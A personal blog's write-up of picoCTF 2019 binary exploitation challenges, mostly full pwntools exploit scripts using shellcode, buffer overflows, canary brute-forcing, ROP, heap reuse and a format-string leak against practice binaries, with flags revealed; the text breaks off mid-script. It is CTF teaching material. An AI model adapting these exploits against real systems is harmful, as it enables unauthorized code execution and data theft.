<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		 
			
  
    <meta name="twitter:card" content="summary"/>
    
      <meta name="twitter:image" content="https://tcode2k16.github.io/blog/images/avatar.png" />
    
  
  
  <meta name="twitter:title" content="PicoCTF 2019 Writeup: Binary Exploitation"/>
  <meta name="twitter:description" content="solves for picoCTF 2019 Binary Exploitation challenges"/>
  
    <meta name="twitter:site" content="@tcode2k16"/>
  
  
  
  
    <meta name="twitter:creator" content="@Alan Chang"/>
  



		
		<meta name="author" content="Alan Chang">
		<meta name="description" content="a random blog about cybersecurity and programming">
		<meta name="generator" content="Hugo 0.58.2" />
		<title>PicoCTF 2019 Writeup: Binary Exploitation &middot; Alan&#39;s Blog</title>
		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">

		
		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
		

		
		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
		

		
	</head>

    <body>
       <nav class="main-nav">
	
	
		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
	
	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
	<a href='https://tcode2k16.github.io/blog/about'>About</a>

	

	
	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
	
</nav>


        <section id="wrapper" class="post">
            <article>
                <header>
                    <h1>
                        PicoCTF 2019 Writeup: Binary Exploitation
                    </h1>
                    <h2 class="headline">
                    Oct 12, 2019 00:00
                    · 5411 words
                    · 26 minute read
                      <span class="tags">
                      
                      
                          
                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
                          
                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
                          
                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
                          
                              <a href="https://tcode2k16.github.io/blog/tags/picoctf">picoctf</a>
                          
                              <a href="https://tcode2k16.github.io/blog/tags/pwn">pwn</a>
                          
                      
                      
                      </span>
                    </h2>
                </header>
                
                  
                    <div id="toc">
                      <nav id="TableOfContents">
<ul>
<li><a href="#handy-shellcode">handy-shellcode</a>
<ul>
<li><a href="#problem">Problem</a></li>
<li><a href="#solution">Solution</a></li>
</ul></li>
<li><a href="#practice-run-1">practice-run-1</a>
<ul>
<li><a href="#problem-1">Problem</a></li>
<li><a href="#solution-1">Solution</a></li>
</ul></li>
<li><a href="#overflow-0">OverFlow 0</a>
<ul>
<li><a href="#problem-2">Problem</a></li>
<li><a href="#solution-2">Solution</a></li>
</ul></li>
<li><a href="#overflow-1">OverFlow 1</a>
<ul>
<li><a href="#problem-3">Problem</a></li>
<li><a href="#solution-3">Solution</a></li>
</ul></li>
<li><a href="#newoverflow-1">NewOverFlow-1</a>
<ul>
<li><a href="#problem-4">Problem</a></li>
<li><a href="#solution-4">Solution</a></li>
</ul></li>
<li><a href="#slippery-shellcode">slippery-shellcode</a>
<ul>
<li><a href="#problem-5">Problem</a></li>
<li><a href="#solution-5">Solution</a></li>
</ul></li>
<li><a href="#newoverflow-2">NewOverFlow-2</a>
<ul>
<li><a href="#problem-6">Problem</a></li>
<li><a href="#solution-6">Solution</a></li>
</ul></li>
<li><a href="#overflow-2">OverFlow 2</a>
<ul>
<li><a href="#problem-7">Problem</a></li>
<li><a href="#solution-7">Solution</a></li>
</ul></li>
<li><a href="#canary">CanaRy</a>
<ul>
<li><a href="#problem-8">Problem</a></li>
<li><a href="#solution-8">Solution</a></li>
</ul></li>
<li><a href="#leap-frog">leap-frog</a>
<ul>
<li><a href="#problem-9">Problem</a></li>
<li><a href="#solution-9">Solution</a></li>
</ul></li>
<li><a href="#messy-malloc">messy-malloc</a>
<ul>
<li><a href="#problem-10">Problem</a></li>
<li><a href="#solution-10">Solution</a></li>
</ul></li>
<li><a href="#stringzz">stringzz</a>
<ul>
<li><a href="#problem-11">Problem</a></li>
<li><a href="#solution-11">Solution</a></li>
</ul></li>
<li><a href="#got">GoT</a>
<ul>
<li><a href="#problem-12">Problem</a></li>
<li><a href="#solution-12">Solution</a></li>
</ul></li>
<li><a href="#pointy">pointy</a>
<ul>
<li><a href="#problem-13">Problem</a></li>
<li><a href="#solution-13">Solution</a></li>
</ul></li>
<li><a href="#seed-spring">seed-sPRiNG</a>
<ul>
<li><a href="#problem-14">Problem</a></li>
<li><a href="#solution-14">Solution</a></li>
</ul></li>
<li><a href="#afterlife">AfterLife</a>
<ul>
<li><a href="#problem-15">Problem</a></li>
<li><a href="#solution-15">Solution</a></li>
</ul></li>
<li><a href="#l1im1tl355">L1im1tL355</a>
<ul>
<li><a href="#problem-16">Problem</a></li>
<li><a href="#solution-16">Solution</a></li>
</ul></li>
<li><a href="#secondlife">SecondLife</a>
<ul>
<li><a href="#problem-17">Problem</a></li>
<li><a href="#solution-17">Solution</a></li>
</ul></li>
<li><a href="#rop32">rop32</a>
<ul>
<li><a href="#problem-18">Problem</a></li>
<li><a href="#solution-18">Solution</a></li>
</ul></li>
<li><a href="#rop64">rop64</a>
<ul>
<li><a href="#problem-19">Problem</a></li>
<li><a href="#solution-19">Solution</a></li>
</ul></li>
<li><a href="#heap-overflow">Heap overflow</a>
<ul>
<li><a href="#problem-20">Problem</a></li>
<li><a href="#solution-20">Solution</a></li>
</ul></li>
</ul>
</nav>
                    </div>
                  
                
                <section id="post-body">
                    

<h1 id="handy-shellcode">handy-shellcode</h1>

<h2 id="problem">Problem</h2>

<p>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/handy-shellcode/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/handy-shellcode/vuln.c">Source</a></p>

<h2 id="solution">Solution</h2>

<p>The solution is basically the same as the <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#shellcode">shellcode</a>  challenge from last year (click the link for my writeup on that).</p>

<p>Here&rsquo;s the exploit script that I used:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('/problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9/vuln')
  REMOTE = True

sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
sh.sendlineafter('$ ', 'cat /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9/flag.txt')
sh.interactive()

</code></pre>

<p>flag: <code>picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}</code></p>

<h1 id="practice-run-1">practice-run-1</h1>

<h2 id="problem-1">Problem</h2>

<p>You&rsquo;re going to need to know how to run programs if you&rsquo;re going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/practice-run-1/run_this">Binary</a></p>

<h2 id="solution-1">Solution</h2>

<pre><code class="language-term">$ ssh alanc@2019shell1.picoctf.com
alanc@pico-2019-shell1:~$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
alanc@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ./run_this 
picoCTF{g3t_r3adY_2_r3v3r53}
</code></pre>

<p>flag: <code>picoCTF{g3t_r3adY_2_r3v3r53}</code></p>

<h1 id="overflow-0">OverFlow 0</h1>

<h2 id="problem-2">Problem</h2>

<p>This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. Source.</p>

<p><a href="/blog/piOverFlow 0coctf-2019-writeup/binary-exploitation/OverFlow 0/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/OverFlow 0/vuln.c">Source</a></p>

<h2 id="solution-2">Solution</h2>

<p>Same as <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-0">buffer-overflow-0</a> from last year.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process([BINARY,'a'*(128+4)+p32(0xdeadbeef)], stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process(['vuln','a'*(128+4)+p32(0xdeadbeef)], cwd='/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7')
  REMOTE = True


sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{3asY_P3a5yb197d4e2}</code></p>

<h1 id="overflow-1">OverFlow 1</h1>

<h2 id="problem-3">Problem</h2>

<p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_2_305519bf80dcdebd46c8950854760999 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/OverFlow 1/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/OverFlow 1/vuln.c">Source</a></p>

<h2 id="solution-3">Solution</h2>

<p>Same as <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-1">buffer-overflow-1</a> from last year.</p>

<p>One thing to clarify is how I found the offset of the return address. In the case, I found the offset to be <code>0x48+4</code> or <code>76</code>. This is obtained by using a tool like radare2 and looking at the stack layout of the function:</p>

<pre><code>$ r2 ./vuln
[0x080484d0]&gt; aaaa
[0x080484d0]&gt; afl~flag
0x080485e6    3 121          sym.flag
[0x080484d0]&gt; pdf @ sym.vuln
/ (fcn) sym.vuln 63
|   sym.vuln ();
|           ; var char *s @ ebp-0x48
|           ; var int32_t var_4h @ ebp-0x4
</code></pre>

<p>As you can see, the buffer is located at <code>ebp-0x48</code> and we know there are another 4 bytes for the saved ebp register. That&rsquo;s how we can find the offset.</p>

<p>Another approach would be to use something like <a href="https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/">this</a> and deduce the offset by looking at the segfault address.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/overflow-1_2_305519bf80dcdebd46c8950854760999')
  REMOTE = True

win_addr = 0x080485e6

payload = 'a'*(0x48+4)+p32(win_addr)

sh.sendlineafter(': ', payload)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}</code></p>

<h1 id="newoverflow-1">NewOverFlow-1</h1>

<h2 id="problem-4">Problem</h2>

<p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_2_305519bf80dcdebd46c8950854760999 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/NewOverFlow-1/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/NewOverFlow-1/vuln.c">Source</a></p>

<h2 id="solution-4">Solution</h2>

<p>This is a simple buffer overflow challenge like <a href="#overflow-1">OverFlow 1</a> (read this to see how I found the return address offset), but instead of 32 bit, it is now 64 bit.</p>

<p>There&rsquo;s a slight problem with calling the win function directly because of buffering problems, so we need to call the main first before calling the win function. Our payload would look something like this:</p>

<ul>
<li>offset</li>
<li>main_addr</li>
<li>win_addr</li>
</ul>

<hr />

<blockquote>
<p><strong>2019.10.13 Update</strong></p>
</blockquote>

<p>The problem with calling the win function directly is <strong>not</strong> because of buffering issues. Instead, it is triggered by a stack misalignment. When we send a payload without calling the main function:</p>

<ul>
<li>offset</li>
<li>win_addr</li>
</ul>

<p>We see in gdb (with <a href="https://github.com/hugsy/gef">gef</a>) that it crashed on <code>movaps</code>:</p>

<pre><code>...
   $rsp   : 0x00007ffda0c16528  →  0x0000000000000000
...
   0x7f32ef45065c &lt;buffered_vfprintf+140&gt; punpcklqdq xmm0, xmm0
   0x7f32ef450660 &lt;buffered_vfprintf+144&gt; mov    DWORD PTR [rsp+0xa4], eax
   0x7f32ef450667 &lt;buffered_vfprintf+151&gt; lea    rax, [rip+0x3890f2]        # 0x7f32ef7d9760 &lt;_IO_helper_jumps&gt;
 → 0x7f32ef45066e &lt;buffered_vfprintf+158&gt; movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7f32ef450673 &lt;buffered_vfprintf+163&gt; mov    QWORD PTR [rsp+0x108], rax
   0x7f32ef45067b &lt;buffered_vfprintf+171&gt; call   0x7f32ef44d390 &lt;_IO_vfprintf_internal&gt;
   0x7f32ef450680 &lt;buffered_vfprintf+176&gt; mov    r12d, eax
   0x7f32ef450683 &lt;buffered_vfprintf+179&gt; mov    r13d, DWORD PTR [rip+0x39225e]        # 0x7f32ef7e28e8 &lt;__libc_pthread_functions_init&gt;
   0x7f32ef45068a &lt;buffered_vfprintf+186&gt; test   r13d, r13d
</code></pre>

<p><a href="https://c9x.me/x86/html/file_module_x86_id_180.html">A quick google search</a> shows that &ldquo;When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated&rdquo; which is what caused the segfault. In other words, the program crashed because <code>rsp+0x50</code> which equals <code>0x7ffda0c16578</code> is not a multiple of 16. To fix this, we really just need to shift the stack by 8 bytes through calling any other function before the win function:</p>

<ul>
<li>offset</li>
<li>any_function_addr</li>
<li>win_addr</li>
</ul>

<p>For example, a payload of <code>payload = 'a'*(0x40+8)+p64(0x00000000004005de)+p64(win_addr)</code> also works where <code>0x00000000004005de</code> is a simple ret gadget:</p>

<pre><code>$ r2 ./vuln
[0x00400680]&gt; pd 1 @ 0x00000000004005de
            0x004005de      c3             ret
</code></pre>

<p>Thanks <a href="http://disq.us/p/24wpy1g">unprovoked</a> for bringing this to my attention.</p>

<hr />

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50')
  REMOTE = True


win_addr = 0x00400767
main_addr = 0x004007e8
payload = 'a'*(0x40+8)+p64(main_addr)+p64(win_addr)

sh.sendlineafter(': ', payload)
sh.sendlineafter(': ', 'a')
sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_1a8eb93a}</code></p>

<h1 id="slippery-shellcode">slippery-shellcode</h1>

<h2 id="problem-5">Problem</h2>

<p>This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/slippery-shellcode/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/slippery-shellcode/vuln.c">Source</a></p>

<h2 id="solution-5">Solution</h2>

<p>This is similar to <a href="#handy-shellcode">handy-shellcode</a> but a random offset is added to the address that it is calling:</p>

<pre><code class="language-c">int offset = (rand() % 256) + 1;

((void (*)())(buf+offset))();
</code></pre>

<p>To bypass this, we can add a <a href="https://en.wikipedia.org/wiki/NOP_slide">nop slide</a> in front of our shellcode payload which is basically a ton of <code>nop</code> instructions. This allows the shellcode to execute as long as the calling address lands on one of the <code>nop</code> instructions.</p>

<p>Also, check out the <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#gps">gps</a> challenge from last year which is about the same technique.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('/problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0/vuln')
  REMOTE = True


sh.sendlineafter(':\n', '\x90'*256+asm(shellcraft.i386.linux.sh()))
sh.sendlineafter('$ ', 'cat /problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0/flag.txt')
sh.interactive()

</code></pre>

<p>flag: <code>picoCTF{sl1pp3ry_sh311c0d3_0fb0e7da}</code></p>

<h1 id="newoverflow-2">NewOverFlow-2</h1>

<h2 id="problem-6">Problem</h2>

<p>Okay now lets try mainpulating arguments. program. You can find it in /problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/NewOverFlow-2/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/NewOverFlow-2/vuln.c">Source</a></p>

<h2 id="solution-6">Solution</h2>

<p>Think the challenge author forgot to remove the <code>flag</code> function which makes the challenge solvable with the same script as <a href="#newoverflow-1">NewOverFlow-1</a></p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7')
  REMOTE = True

# $ r2 ./vuln
# [0x00400680]&gt; aaaa
# [0x00400680]&gt; afl~flag
# 0x0040084d    3 101          sym.flag
# [0x00400680]&gt; afl~main
# 0x004008ce    1 105          main

win_addr = 0x0040084d
main_addr = 0x004008ce
payload = 'a'*(0x40+8)+p64(main_addr)+p64(win_addr)

sh.sendlineafter('?\n', payload)
sh.sendlineafter('?\n', 'a')
sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{r0p_1t_d0nT_st0p_1t_64362a2b}</code></p>

<h1 id="overflow-2">OverFlow 2</h1>

<h2 id="problem-7">Problem</h2>

<p>Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/OverFlow 2/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/OverFlow 2/vuln.c">Source</a></p>

<h2 id="solution-7">Solution</h2>

<p>This challenge is about the 32bit x86 calling convention where we need to call the <code>flag</code> function with two parameters. I have already done a detailed writeup for last year&rsquo;s <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-2">buffer-overflow-2</a> challenge which is similar.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
  sh = s.process('vuln', cwd='/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e')
  REMOTE = True

# $  r2 ./vuln
# [0x080484d0]&gt; aaaa
# [0x080484d0]&gt; afl~flag
# 0x080485e6    8 144          sym.flag
# [0x080484d0]&gt; pdf @ sym.vuln
# / (fcn) sym.vuln 63
# |   sym.vuln ();
# |           ; var char *s @ ebp-0xb8
# |           ; var int32_t var_4h @ ebp-0x4

win_addr = 0x080485e6

payload = 'a'*(0xb8+4)+p32(win_addr)+'a'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)

sh.sendlineafter(': ', payload)

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{arg5_and_r3turn55897b905}</code></p>

<h1 id="canary">CanaRy</h1>

<h2 id="problem-8">Problem</h2>

<p>This time we added a canary to detect buffer overflows. Can you still find a way to retrieve the flag from this program located in /problems/canary_4_221260def5087dde9326fb0649b434a7. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/CanaRy/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/CanaRy/vuln.c">Source</a></p>

<h2 id="solution-8">Solution</h2>

<p>Same as <a href="/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-3">buffer-overflow-3</a> from last year. The key point is that we can guess the constant canary one byte at a time and we can also bypass PIE by bruting forcing plus a partial overwrite.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)

def start():
  global sh
  if len(argv) &lt; 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    
    sh = s.process('vuln', cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
    REMOTE = True

# key = ''
# for i in range(4):
#   for c in range(256):
#     start()
#     c = chr(c)
#     sh.sendlineafter('&gt; ', str(33+i))
#     sh.sendlineafter('&gt; ', 'a'*32+key+c)
#     data = sh.recvall()
#     if 'Stack Smashing Detected' not in data:
#       key += c
#       print enhex(key)
#       break
#   else:
#     print 'error'
#     exit()

key = unhex('4c6a6748')

while True:
  start()
  

  sh.sendlineafter('&gt; ', str(32+4+12+6))
  sh.sendlineafter('&gt; ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
  # sh.interactive()
  data = sh.recvall(timeout=0.5)
  if 'pico' in data:
    print data
    exit()

</code></pre>

<p>flag: <code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_bf34cd22}</code></p>

<h1 id="leap-frog">leap-frog</h1>

<h2 id="problem-9">Problem</h2>

<p>Can you jump your way to win in the following program and get the flag? You can find the program in /problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c on the shell server? Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/leap-frog/rop">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/leap-frog/rop.c">Source</a></p>

<h2 id="solution-9">Solution</h2>

<p>This is a classic <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> challenge. But instead of going through all the hoops as intended, we can set all <code>win*</code> variables to 1 by calling gets with a payload that looks like this:</p>

<ul>
<li>padding</li>
<li>gets_plt &lt;- first function to call</li>
<li>flag_addr &lt;- second function to call</li>
<li>win_addr &lt;- the buffer parameter being passed to gets</li>
</ul>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys
import subprocess

argv = sys.argv

DEBUG = True
BINARY = './rop'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'error'


def start():
  global sh
  if len(argv) &lt; 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    if DEBUG:
      attach_gdb()

    REMOTE = False
  else:
    s = ssh(host='2019shell1.picoctf.com', user='sashackers', password=&quot;XXX&quot;)
    sh = s.process('rop', cwd='/problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c')
    REMOTE = True

main_addr = 0x80487c9
gets_plt = 0x08048430
win1_addr = 0x0804A03D
display_flag_addr = 0x080486b3

start()
payload = 'a'*28
payload += p32(gets_plt)
payload += p32(display_flag_addr)
payload += p32(win1_addr)
# payload += p32(0x38c0)[:-2]
sh.sendlineafter('&gt; ', payload)
sh.sendline('\x01'*3)
sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}</code></p>

<h1 id="messy-malloc">messy-malloc</h1>

<h2 id="problem-10">Problem</h2>

<p>Can you take advantage of misused malloc calls to leak the secret through this service and get the flag? Connect with <code>nc 2019shell1.picoctf.com 12286</code>. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/messy-malloc/auth">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/messy-malloc/auth.c">Source</a></p>

<h2 id="solution-10">Solution</h2>

<p>Because the program uses <code>malloc</code> instead of <code>calloc</code>, we can allocate a heap chunk for the username that has the same size as a user struct, and then we can free the chunk and allocate the same chunk now as a user struct. Because the data we previously entered is still there, we can set the <code>access_code</code> and get the flag.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

# picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}
argv = sys.argv

DEBUG = True
BINARY = './auth'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) &lt; 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  sh = remote('2019shell1.picoctf.com', 12286)
  REMOTE = True

code = ''
code += unhex('4343415f544f4f52')[::-1]
code += unhex('45444f435f535345')[::-1]
print code

sh.sendlineafter('&gt; ', 'login')
sh.sendlineafter('username\n', '32')


payload = ''
payload += p64(0x0000000000602000) # username ptr
payload += code
payload += p64(0xdeadbeefdeadbeef) # files ptr

sh.sendlineafter('username\n', payload)
sh.sendlineafter('&gt; ', 'logout')


sh.sendlineafter('&gt; ', 'login')
sh.sendlineafter('username\n', '16')
sh.sendlineafter('username\n', 'bbb')

sh.sendlineafter('&gt; ', 'print-flag')

sh.interactive()
</code></pre>

<p>flag: <code>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}</code></p>

<h1 id="stringzz">stringzz</h1>

<h2 id="problem-11">Problem</h2>

<p>Use a format string to pwn this program and get a flag. Its also found in /problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4 on the shell server. Source.</p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/stringzz/vuln">Binary</a></p>

<p><a href="/blog/picoctf-2019-writeup/binary-exploitation/stringzz/vuln.c">Source</a></p>

<h2 id="solution-11">Solution</h2>

<p>As suggested by the description, this is a format string attack challenge where we are able to control the format string being passed to <code>printf</code>:</p>

<pre><code class="language-c">void printMessage3(char *in)
{
  puts(&quot;will be printed:\n&quot;);
  printf(in);
}
</code></pre>

<p>Another important information is that although the flag is loaded onto the heap, there&rsquo;s still a pointer to it located on the stack:</p>

<pre><code class="language-c">char * buf = malloc(sizeof(char)*FLAG_BUFFER);
FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
fgets(buf,FLAG_BUFFER,f);
</code></pre>

<p>So if we do <code>%XX$s</code> with the correct offset, we can print out the flag.</p>

<p>Exploit script:</p>

<pre><code class="language-python">from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

